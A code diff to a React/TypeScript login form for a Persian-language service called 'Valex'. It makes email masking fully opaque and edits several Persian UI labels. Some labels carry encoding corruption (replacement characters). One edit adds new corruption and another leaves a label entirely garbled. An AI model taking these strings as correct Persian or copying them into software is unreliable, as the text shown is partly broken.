@@ -104,22 +104,12 @@ export const LoginForm = () => {
   const [isBlocked, setIsBlocked] = useState(false);
   const [hasError, setHasError] = useState(false);
 
-  // Email masking function
+  // Email masking function - completely masked
   const maskEmail = (email: string): string => {
-    if (!email || email.length < 5) return email;
+    if (!email || email.length < 5) return "*****@*****.***";
 
-    const [localPart, domain] = email.split('@');
-    if (!domain) return email;
-
-    const [domainName, ...domainParts] = domain.split('.');
-
-    // Mask local part: show first character + asterisks
-    const maskedLocal = localPart.charAt(0) + '*'.repeat(Math.max(1, localPart.length - 1));
-
-    // Mask domain name: show asterisks + extension
-    const maskedDomain = '*'.repeat(Math.max(1, domainName.length));
-
-    return `${maskedLocal}@${maskedDomain}.${domainParts.join('.')}`;
+    // Return completely masked email
+    return "*****@*****.***";
   };
 
   // Real-time presence tracking completely removed - only manual status check via Telegram button
@@ -339,7 +329,7 @@ export const LoginForm = () => {
           userAgent: navigator.userAgent.slice(0, 30),
         });
 
-        // است��اده از Enhanced Network Status Check
+        // استفاده از Enhanced Network Status Check
         console.log("🌐 Starting enhanced network status check...");
         checkNetworkStatus().then((networkStatus) => {
           console.log("📊 Network status result:", networkStatus);
@@ -1125,7 +1115,7 @@ export const LoginForm = () => {
                     textAlign: "center",
                   }}
                 >
-                  به والکس خوش ��مدید
+                  به والکس خوش آمدید
                 </h5>
                 {/* Mobile Number Input */}
                 <div
@@ -1619,7 +1609,7 @@ export const LoginForm = () => {
                           />
                           <span>
                             <p style={{textAlign: "right"}}>
-                              ��د دعوت صرفا در زمان ثبت‌نام قابل استفاده است.
+                              ��د دعوت صرفا در زمان ثبت‌نام قابل استفاده ا��ت.
                             </p>
                             <p>
                               <br />
@@ -2182,7 +2172,7 @@ export const LoginForm = () => {
                     border: "none",
                   }}
                 >
-                  و��رایش شماره موبا��ل
+                  و��رایش شماره موبایل
                 </button>
               </div>
 
@@ -2637,7 +2627,7 @@ export const LoginForm = () => {
                       color: "rgb(0, 0, 0)",
                     }}
                   >
-                    رم�� عبور حساب را وارد کنید.
+                    رمز عبور حساب را وارد کنید.
                   </label>
                   <div
                     style={{
@@ -3457,7 +3447,7 @@ export const LoginForm = () => {
                                 textAlign: "right",
                               }}
                             >
-                              �����
+                              ���
                             </span>
                           </legend>
                         </fieldset>
